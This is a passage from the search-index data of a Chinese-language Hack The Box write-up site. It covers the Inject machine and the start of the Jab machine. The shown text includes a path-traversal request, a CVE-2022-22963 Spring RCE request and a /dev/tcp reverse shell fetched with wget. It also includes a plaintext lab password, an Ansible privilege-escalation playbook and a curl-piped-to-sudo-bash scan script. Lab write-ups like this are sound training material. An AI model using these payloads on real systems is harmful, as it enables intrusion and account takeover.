/show_image?img=../../../../../../etc/passwd HTTP/1.1\n\n---\n\nroot:x:0:0:root:/root:/bin/bash\n\u2026\u2026\nfrank:x:1000:1000:frank:/home/frank:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nsshd:x:113:65534::/run/sshd:/usr/sbin/nologin\nphil:x:1001:1001::/home/phil:/bin/bash\nfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\n_laurel:x:997:996::/var/log/laurel:/bin/false\n</code></pre></p> <p>\u6ce8\u610f\u8fd9\u4e24\u4e2aid 1000\u4ee5\u540e\u7684\uff1a  </p> <p>frank:x:1000:1000:frank:/home/frank:/bin/bash phil:x:1001:1001::/home/phil:/bin/bash</p> <p>\u53ef\u4ee5\u53d1\u73b0user.txt\u5c31\u5728phil\u7684\u5bb6\u76ee\u5f55\u91cc\uff0c\u4e0d\u8fc7\u8bbf\u95ee\u4e86\u4e00\u4e0b\u6ca1\u6709\u83b7\u53d6\u5230\u7ed3\u679c\uff0c\u5e94\u8be5\u662f\u6ca1\u6709\u6743\u9650\u3002</p> <p>\u518d\u56de\u5230\u6700\u521d\u7684 <code>../</code> \u76ee\u5f55\u4e0b\uff0c\u597d\u50cf\u770b\u5230java\u3002\u5e94\u8be5\u662f\u5173\u4e8e8080\u7aef\u53e3\u90e8\u7f72\u7684\u670d\u52a1\u3002 \u63a2\u7d22\uff1a</p> payload \u4fe1\u606f ../../../.project \\&lt;name&gt;org.springframework.ide.eclipse.boot.validation.springbootbuilder\\&lt;/name&gt; ../../../HELP.md Official Apache Maven ../../../pom.xml http://maven.apache.org/POM/4.0.0 <p>\u56e0\u4e3a\u6709\u7248\u672c\u53f7\u7684\u6837\u5b50\uff0c\u641c\u4e86\u4e00\u4e0b\u201cmaven pom 4.0.0 exploit\u201d\u3002\u627e\u5230\u6587\u7ae0\u5b66\u4e60\u4e00\u4e0b\u8fd9\u4e2aPOM\u3002\u4f3c\u4e4e\u8fd9\u4e2a\u6587\u4ef6\u8fd8\u633a\u91cd\u8981\u7684\uff0c\u8fd9\u4e2a\u670d\u52a1\u5c31\u662f\u7528\u8fd9\u4e2a\u6587\u4ef6\u90e8\u7f72\u7684\u610f\u601d\uff1f</p> <p>https://security.humanativaspa.it/abusing-mavens-pom-xml/</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#pomxml","title":"pom.xml","text":"<p>\u4ed4\u7ec6\u770b\u770b\u8fd9\u4e2apom.xml\uff0c\u91cc\u9762\u8fd8\u633a\u591a\u7248\u672c\u4fe1\u606f\u7684\u3002</p> <ul> <li>pom: 4.0.0</li> <li>spring-boot-starter-parent: 2.6.5</li> <li>WebApp(?): 0.0.1-SNAPSHOT</li> <li>java: 11</li> <li>javax.activation: 1.2.0</li> <li>spring-cloud-function-web: 3.2.2</li> <li>bootstrap: 5.1.3</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;parent&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n        &lt;version&gt;2.6.5&lt;/version&gt;\n        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;\n    &lt;/parent&gt;\n    &lt;groupId&gt;com.example&lt;/groupId&gt;\n    &lt;artifactId&gt;WebApp&lt;/artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;name&gt;WebApp&lt;/name&gt;\n    &lt;description&gt;Demo project for Spring Boot&lt;/description&gt;\n    &lt;properties&gt;\n        &lt;java.version&gt;11&lt;/java.version&gt;\n    &lt;/properties&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.sun.activation&lt;/groupId&gt;\n            &lt;artifactId&gt;javax.activation&lt;/artifactId&gt;\n            &lt;version&gt;1.2.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt;\n            &lt;scope&gt;runtime&lt;/scope&gt;\n            &lt;optional&gt;true&lt;/optional&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\n            &lt;version&gt;3.2.2&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.webjars&lt;/groupId&gt;\n            &lt;artifactId&gt;bootstrap&lt;/artifactId&gt;\n            &lt;version&gt;5.1.3&lt;/version&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.webjars&lt;/groupId&gt;\n            &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n\n    &lt;/dependencies&gt;\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n                &lt;version&gt;${parent.version}&lt;/version&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n        &lt;finalName&gt;spring-webapp&lt;/finalName&gt;\n    &lt;/build&gt;\n\n&lt;/project&gt;\n</code></pre> <p>\u641c\u201cspring-boot-starter-parent 2.6.5 exploit\u201d\u80fd\u770b\u5230\u8fd9\u51e0\u7bc7\u6587\u7ae0\uff1a</p> <p>https://www.fastly.com/jp/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022 https://codetinkering.com/spring4shell-vulnerability-fix</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#poc-cve-2022-22963","title":"PoC (CVE-2022-22963)","text":"<p>\u672c\u6765\u4ee5\u4e3a\u662fCVE-2022-22965\uff0c\u7528msf\u8bd5\u4e86\u4e0b\u4e0d\u884c\u7684\u6837\u5b50\u3002</p> <p>\u7528Burp\u8bd5\u4e86\u4e00\u4e0b\u4e0a\u9762\u7684\u6587\u7ae0\u91ccCVE-2022-22963\u7684PoC\uff0c\u7136\u540e\u53c8\u76ee\u5f55\u904d\u5386\u770b\u4e86\u4e0b\uff0c\u786e\u8ba4\u6709\u6210\u529f\u521b\u5efa <code>/tmp/pwned</code>\u3002 <pre><code>POST /functionRouter HTTP/1.1\nhost:127.0.0.1:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15\nConnection: close\nspring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")\nContent-Length: 1\n\n.\n</code></pre></p> <p>\u5c1d\u8bd5payload\u6362\u6210\u53cd\u5f39shell\u4e00\u76f4\u6ca1\u53cd\u5e94\u3002\u597d\u50cf\u662f\u53ea\u8981\u6709\u91cd\u5b9a\u5411\u7b26\u53f7\u5c31\u4e0d\u884c\uff1f\uff08\u7528\u6ca1\u6709\u91cd\u5b9a\u5411\u7b26\u7684\u53cd\u5f39shell\u4e5f\u6ca1\u53cd\u5e94\uff0c\u53ef\u80fd\u662f\u6ca1\u547d\u4ee4\u73af\u5883\u5427\u3002\u4e0d\u662f\u5f88\u61c2\uff09</p> <p>\u90a3\u8bd5\u8bd5\u5c06shell\u4f20\u8fc7\u53bb\uff1f kali\u91cc\u521b\u5efa\u53cd\u5f39shell\u811a\u672c\u540e\u7528python\u5f00\u542fhttp\u670d\u52a1\u3002 <pre><code>\u2514\u2500$ cat ss.sh\n#!/usr/bin/bash\n/usr/bin/bash -i &gt;&amp; /dev/tcp/10.xx.xx.xx/4444 0&gt;&amp;1\n\n\u2514\u2500$ python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.204 - - [26/May/2023 08:00:26] \"GET /ss.sh HTTP/1.1\" 200 -\n^C\nKeyboard interrupt received, exiting.\n\n\u2514\u2500$ nc -lvnp 4444           \nlistening on [any] 4444 ...\n</code></pre></p> <p>Brup\u4e5f\u4e00\u8fb9\u63a7\u5236\u76ee\u6807\u673a\u83b7\u53d6\u53cd\u5f39shell\uff0c\u7136\u540e\u6267\u884c\uff0cpayload\u5982\u4e0b\uff1a</p> <ul> <li><code>wget 10.xx.xx.xx:80/ss.sh -O /tmp/ss.sh</code></li> <li><code>bash /tmp/ss.sh</code></li> </ul> <p>\u6210\u529f\u83b7\u5f97frank\u7528\u6237\u7684shell\uff1a <pre><code>\u2514\u2500$ nc -lvnp 4444           \nlistening on [any] 4444 ...\nconnect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.204] 42834\nbash: cannot set terminal process group (789): Inappropriate ioctl for device\nbash: no job control in this shell\nfrank@inject:/$ id\nid\nuid=1000(frank) gid=1000(frank) groups=1000(frank)\n</code></pre></p> <p>\u987a\u4fbf\u770b\u4e86\u4e00\u773c\uff0c\u539f\u6765\u521a\u521a\u7684\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u4f20\u8fc7\u53bb\u7684\u53cd\u5f39shell\u5c5e\u4e3b\u5c31\u662ffrank\u3002</p> <p>\u63a2\u7d22SUID\u65e0\u53d1\u73b0\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#phil","title":"\u53d1\u73b0phil\u7528\u6237\u5bc6\u7801","text":"<p>\u7136\u540e\u770b\u4e86\u770b\u5bb6\u76ee\u5f55\uff0c\u53d1\u73b0\u9690\u85cf\u6587\u4ef6\u5939 <code>.m2</code>\uff0c\u53c8\u4ece\u91cc\u9762\u7684 <code>settings.xml</code> \u53d1\u73b0phil\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801\uff1a <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n  &lt;servers&gt;\n    &lt;server&gt;\n      &lt;id&gt;Inject&lt;/id&gt;\n      &lt;username&gt;phil&lt;/username&gt;\n      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;\n      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;\n      &lt;filePermissions&gt;660&lt;/filePermissions&gt;\n      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;\n      &lt;configuration&gt;&lt;/configuration&gt;\n    &lt;/server&gt;\n  &lt;/servers&gt;\n&lt;/settings&gt;\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#flag-user","title":"flag: user","text":"<p>\u79fb\u52a8\u5230\u7528\u6237phil\uff1a <pre><code>frank@inject:/$ su phil\nsu phil\nPassword: DocPhillovestoInject123\n\nid\nuid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)\n\ncat ~/user.txt\n1bf3\u2026\u20263bf1\n</code></pre></p> <p>\u4e00\u5f00\u59cb <code>su</code> \u8f93\u5165\u547d\u4ee4\u4e4b\u540e\u770b\u7ec8\u7aef\u6ca1\u4ec0\u4e48\u663e\u793a\uff0c\u8fd8\u4ee5\u4e3a\u4e0d\u884c\u2026\u2026\u7136\u540eSSH\u4e5f\u8fde\u63a5\u5931\u8d25\u3002\u6574\u5f97\u6211\u4ee5\u4e3a\u5361\u4e86\u8fd8\u76f4\u63a5Ctrl+C\u9000\u51fa\u4e86 \u4e0d\u7ba1\u548b\u7684\u5207\u6362\u7528\u6237\u4e4b\u540e\u8fd8\u662f\u5f97id\u770b\u4e00\u4e0b\u554a\u2026\u2026 \u540e\u6765\u624d\u77e5\u9053\u539f\u6765\u7b80\u5355\u6267\u884c <code>bash -i</code> \u5c31\u884c <pre><code>bash -i\nbash: cannot set terminal process group (789): Inappropriate ioctl for device\nbash: no job control in this shell\nphil@inject:~$ \n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u6ce8\u610fphil\u7528\u6237\u6709\u4e2a\u4e0d\u5bfb\u5e38\u7684\u7ec4\u201c50(staff)\u201d\u3002</p> <p>\u76f4\u63a5find\u4e00\u4e0b\u5c5e\u4e8estaff\u7ec4\u7684\u6587\u4ef6\uff1a <pre><code>find / -group staff 2&gt;/dev/null\n/opt/automation/tasks\n/root\n/var/local\n/usr/local/lib/python3.8\n\u2026\u2026\n</code></pre></p> <p>\u7adf\u7136\u6709root\uff0c\u4e0d\u8fc7\u8be6\u7ec6\u770b\u4e86\u4e0b\u5176\u5b9estaff\u7ec4\u5728root\u76ee\u5f55\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u3002 \u90a3\u5c31\u770b\u770b\u4e0b\u4e00\u4e2a\u8f83\u53ef\u7591\u7684\u6587\u4ef6/\u76ee\u5f55 <code>/opt/automation/tasks</code>\u3002</p> <p>\u5148\u770b\u770b\u6743\u9650\uff0cstaff\u7ec4\u662f\u6709\u6240\u6709\u6743\u9650\u7684\uff1a <pre><code>drwxrwxr-x 2 root staff 4096 May 26 13:24 tasks/\n</code></pre></p> <p>tasks\u91cc\u9762\u6709\u4e2aroot\u6743\u9650\u7684yml\u6587\u4ef6\u3002\u8fd9\u4e0d\u662fansible\u561b\uff0c\u6b63\u597d\u81ea\u5df1\u6709\u73a9\u8fc7 <pre><code>phil@inject:/opt/automation$ cd tasks\nphil@inject:/opt/automation/tasks$ ll\n-rw-r--r-- 1 root root   150 May 26 13:30 playbook_1.yml\n\nphil@inject:/opt/automation/tasks$ cat playbook_1.yml\ncat playbook_1.yml\n- hosts: localhost\n  tasks:\n  - name: Checking webapp service\n    ansible.builtin.systemd:\n      name: webapp\n      enabled: yes\n      state: started\n</code></pre></p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728tasks\u76ee\u5f55\u91cc\u5199\u5165\u4e00\u4e2aget shell\u7684playbook\uff1f\u4f46\u662f\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f</p> <p>\u770b\u4e86\u773csudo\u4e5f\u6ca1\u6709\u5173\u4e8eansible\u7684\uff1a <pre><code>phil@inject:/opt/automation$ sudo -lS\nsudo -lS\n[sudo] password for phil: DocPhillovestoInject123\nSorry, user phil may not run sudo on localhost.\n</code></pre></p> <p>SUID\u4e5f\u6ca1\u6709\u80fd\u5229\u7528\u7684\u3002</p> <p><code>ansible</code> \u547d\u4ee4\u5012\u662f\u80fd\u8fd0\u884c\uff0c\u4f46\u662f\u8dd1\u8d77\u6765\u4f1a\u662froot\u6743\u9650\u5417\uff1f\u2014\u2014playbook\u91cc\u9762\u7684\u8bdd\u5012\u662f\u53ef\u4ee5\u7528 <code>become: true</code> \u5b9e\u73b0\u3002</p> <p>\u603b\u4e4b\u5148\u5199playbook\u5427\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#shell","title":"\u5347\u7ea7\u4e3a\u4ea4\u4e92shell","text":"<p>\u5728\u8fd9\u4e4b\u524d\uff0c\u76ee\u524d\u7684\u975e\u4ea4\u4e92shell\u5728\u4f7f\u7528vim\u7684\u65f6\u5019\u597d\u50cf\u4f1a\u602a\u602a\u7684\uff0c\u5c06\u5176\u8f6c\u6210\u4ea4\u4e92shell\uff1a <pre><code>phil@inject:/opt/automation/tasks$ which python python3\nwhich python python3\n/usr/bin/python3\nphil@inject:/opt/automation/tasks$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n&lt;sks$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nphil@inject:/opt/automation/tasks$ export TERM=xterm\nexport TERM=xterm\nphil@inject:/opt/automation/tasks$ ^Z\nzsh: suspended  nc -lvnp 4444\n\n\u2514\u2500$ stty raw -echo; fg\n[1]  + continued  nc -lvnp 4444\n\nphil@inject:/opt/automation/tasks$ \n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#ansible-playbook","title":"\u7f16\u5199ansible playbook","text":"<p>\u5148\u6d4b\u8bd5\u4e00\u4e0b <pre><code>- hosts: localhost\n  tasks:\n    - name: Run a command as root\n      shell: \"id &gt; /tmp/test; chmod 777 /tmp/test\"\n      become: true\n</code></pre></p> <p>\u4e00\u76f4\u7528AWX\uff0c\u6ca1\u600e\u4e48\u7528\u8fc7ansible\u7684\u547d\u4ee4\u884c\u2026\u2026\u6b63\u5f53\u6211\u770bansible\u7684help\u65f6\uff0c\u6211\u521a\u5199\u7684playbook\u5c31\u88ab\u5220\u4e86\u2026\u2026</p> <p>\u8fd0\u884cplaybook\uff0c\u62a5\u9519\uff1a <pre><code>phil@inject:/opt/automation/tasks$ ansible-playbook test.yml \n[WARNING]: provided hosts list is empty, only localhost is available. Note that\nthe implicit localhost does not match 'all'\n\nPLAY [localhost] ***************************************************************\n\nTASK [Gathering Facts] *********************************************************\nok: [localhost]\n\nTASK [Run a command as root] ***************************************************\nfatal: [localhost]: FAILED! =&gt; {\"changed\": false, \"module_stderr\": \"sudo: a password is required\\n\", \"module_stdout\": \"\", \"msg\": \"MODULE FAILURE\\nSee stdout/stderr for the exact error\", \"rc\": 1}                                      \n\nPLAY RECAP *********************************************************************\nlocalhost                  : ok=1    changed=0    unreachable=0    failed=1    skipped=0    rescued=0    ignored=0\n</code></pre></p> <p>\u5bf9\u54e6\u2026\u2026\u7528 <code>become: true</code> \u8981root\u7684\u5bc6\u7801\u2026\u2026 \u8ff7\u832b\u2026\u2026  </p> <p>\u4f46\u662f\u770b\u4e86\u773c/tmp/\u4e0b\u9762\u6709\u6211playbook\u6267\u884c\u7684\u7ed3\u679c\uff1f\uff1f</p> <pre><code>phil@inject:/opt/automation/tasks$ cat /tmp/test\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#flag-root","title":"flag: root","text":"<p>emmmm\uff0c\u5148\u4e0d\u7ba1\u4e86\uff0c\u62ffflag\u8bd5\u8bd5\u3002\u8fd9\u6b21\u5c06playbook\u6362\u6210\u76f4\u63a5\u62ffflag\uff1a <pre><code>- hosts: localhost\n  tasks:\n    - name: Run a command as root\n      shell: \"cat /root/root.txt &gt; /tmp/test; chmod 777 /tmp/test\"\n</code></pre></p> <p>\u8fd0\u884c\u4e00\u4e0b\uff0c\u62a5\u9519\u3002\u770b\u4e86\u773c <code>/tmp/test</code> \u6587\u4ef6\u4e5f\u6ca1\u53d8\u5316\uff1f \u96be\u9053\u6709\u540e\u53f0\u8fd0\u884c\uff1f\u597d\u50cf\u4e4b\u524d\u770bcron\u4e5f\u6ca1\u5565\u81ea\u52a8\u4efb\u52a1\u3002  </p> <p><code>watch cat /tmp/test</code> \u76d1\u63a7\u770b\u770b\u3002 \u7a81\u7136\u5c31\u6709flag\u4e86\uff01\u770b\u6765\u679c\u7136\u6709\u540e\u53f0\u5728\u8fd0\u884c\u554a\u2026\u2026</p> <p>df13\u2026\u20267ceb</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Inject/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/05/26</p> <p>root\u7b97\u662f\u9634\u5dee\u9633\u9519\u4e86\u2026\u2026   \u540e\u6765\u770bWP\u63d0\u5230\uff0c\u53ef\u4ee5\u4e0a\u4f20pspy64\u626b\u63cf\u4f1a\u627e\u5230\u90a3\u4e2a\u81ea\u52a8\u8fd0\u884c\u7684\u8fdb\u7a0b\uff1f\u4f46\u662fps\u4e3a\u5565\u770b\u4e0d\u4e86\uff1f\u4e0d\u662f\u5f88\u61c2\u2026\u2026\u6709\u7a7a\u8bd5\u8bd5\u8fd9\u4e2a\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Jab/","title":"HTB-Jab","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#relevant-skills","title":"Relevant Skills","text":"<ul> <li>nmap</li> <li>Jabber/XMPP</li> <li>ASREPRoasting</li> <li>hashcat</li> <li>CME/NXC</li> <li>Port Forwarding\uff08chisel\uff09</li> <li>CVE-2023-32315</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#external-recon-nmap","title":"External Recon - nmap","text":"<p>\u81ea\u7528\u626b\u63cf\u811a\u672c\uff1a\u5de5\u4f5c\u6d41 <code>curl -s https://raw.githubusercontent.com/TimeLess613/workflow-scan4HTB/main/workflow-scan4HTB.sh | sudo bash -s &lt;HTB-IP&gt;</code></p> <p>\u5f00\u653e\u7aef\u53e3\uff1a <pre><code>PORT      STATE SERVICE             VERSION\n53/tcp    open  domain              Simple DNS Plus\n88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-03-21 04:13:08Z)\n135/tcp   open  msrpc               Microsoft Windows RPC\n139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn\n389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)\n5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later\n5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later\n5262/tcp  open  jabber\n5263/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later\n5269/tcp  open  xmpp                Wildfire XMPP Client\n5270/tcp  open  ssl/xmpp            Wildfire XMPP Client\n5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later\n5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later\n5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n7070/tcp  open  realserver?\n7443/tcp  open  ssl/oracleas-https?\n7777/tcp  open  socks5              (No authentication; connection failed)\n9389/tcp  open  mc-nmf              .NET Message Framing\n47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n49664/tcp open  msrpc               Microsoft Windows RPC\n49665/tcp open  msrpc               Microsoft Windows RPC\n49666/tcp open  msrpc               Microsoft Windows RPC\n49667/tcp open  msrpc               Microsoft Windows RPC\n49671/tcp open  msrpc               Microsoft Windows RPC\n49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc               Microsoft Windows RPC\n49676/tcp open  msrpc               Microsoft Windows RPC\n49681/tcp open  msrpc               Microsoft Windows RPC\n49776/tcp open  msrpc               Microsoft Windows RPC\n59676/tcp open  msrpc               Microsoft Windows RPC\n65483/tcp open  msrpc               Microsoft Windows RPC\n</code></pre></p> <p>\u9ed8\u8ba4\u811a\u672c\u7ed3\u679c\uff1a <pre><code>PORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n|_ssl-date: 2024-03-21T04:14:58+00:00; -2m51s from scanner time.\n| ssl-cert: Subject: commonName=DC01.jab.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.jab.htb\n| Issuer: commonName=jab-DC01-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2023-11-01T20:16:18\n| Not valid after:  2024-10-31T20:16:18\n| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221\n|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n (...)\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u4e00\u53f0\u57df\u63a7Windows\u673a\u3002\u5f00\u653e\u4e86\u5e38\u89c4\u7684DNS\u3001SMB\u3001LDAP\u3001RPC\u3001winrm\u7cfb\u5217\u7aef\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e2a\u4e0d\u5e38\u89c1\u7684jabber\uff0c\u4f30\u8ba1\u4e5f\u662f\u8fd9\u4e2a\u9776\u673a\u540d\u7684\u7531\u6765\u3002\u4e0e\u5176\u76f8\u5173\u7684\u67095222\u7b49\u7aef\u53e3\uff0c\u67e5\u4e86\u4e0bMXPP\u662fjabber\u7684\u522b\u79f0\u3002\u53e6\u5916\uff0c\u6709\u4e2a\u7aef\u53e37777\u662fsocks5\u3002 \u6ca1\u6709HTTP\u7f51\u9875\uff0c\u521d\u6b65\u5224\u65ad\u4eceSMB\u3001LDAP\u6536\u96c6\u4fe1\u606f\uff0c\u7136\u540e\u8c03\u67e5\u4e0d\u5bfb\u5e38\u7684jabber\u6765\u7a81\u7834\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#smb-","title":"SMB - \u533f\u540d","text":"<p>\u533f\u540d\u8fde\u63a5\u65e0\u6cd5\u5217\u51fa\u5171\u4eab\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ smbclient //10.10.11.4/ -N\n\n\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ \n</code></pre></p> <p>\u6700\u521d\u7684\u9ed8\u8ba4\u811a\u672c\u626b\u63cf\u7ed3\u679c\u4e2d\u4e5f\u786e\u5b9e\u6ca1\u6709SMB\u7684\u4efb\u4f55\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Jab/#ldap-","title":"LDAP - \u533f\u540d","text":"<p>LDAP\u7684\u533f\u540d\u8fde\u63a5\u4e5f\u6ca1\u83b7\u5f97\u4ec0\u4e48\u6709\u7528\u4fe1\u606f\uff0c\u57df\u540d\u3001\u76ee\u6807\u4e3b\u673a\u540d\u4e4b\u524d\u7684\u626b\u63cf\u7ed3\u679c\u4e5f\u80fd\u5f97\u77e5\u5c31\u662f<code>DC01.jab.htb</code>\uff1a <pre><code>\u250c\u2500\u2500(kali\u327fkalik)-[~/Lab/HTB/Jab/infoG]\n\u2514\u2500$ ldapsearch -LLL -x -H ldap://10.10.11.4 -s base                                  \ndn:\ndomainFunctionality: 7\nforestFunctionality: 7\ndomainControllerFunctionality: 7\nrootDomainNamingContext: DC=jab,DC=htb\nldapServiceName: jab.htb:dc01$@JAB.HTB\nisGlobalCatalogReady: TRUE\nsupportedSASLMechanisms: GSSAPI\nsupportedSASLMechanisms: GSS-SPNEGO\nsupportedSASLMechanisms: EXTERNAL\nsupportedSASLMechanisms: DIGEST-MD5\n (...)\nsubschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=jab,DC=htb\nserverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur\n ation,DC=jab,DC=htb\nschemaNamingContext: CN=Schema,CN=Configuration,DC=jab,DC=htb\nnamingContexts: DC=jab,DC=htb\nnamingContexts: CN=Configuration,DC=jab,DC=htb\nnamingContexts: CN=Schema,CN=Configuration,DC=jab,DC=htb\nnamingContexts: DC=DomainDnsZones,DC=jab,DC=htb\nnamingContexts: DC=ForestDnsZones,DC=jab,DC=htb\nisSynchronized: 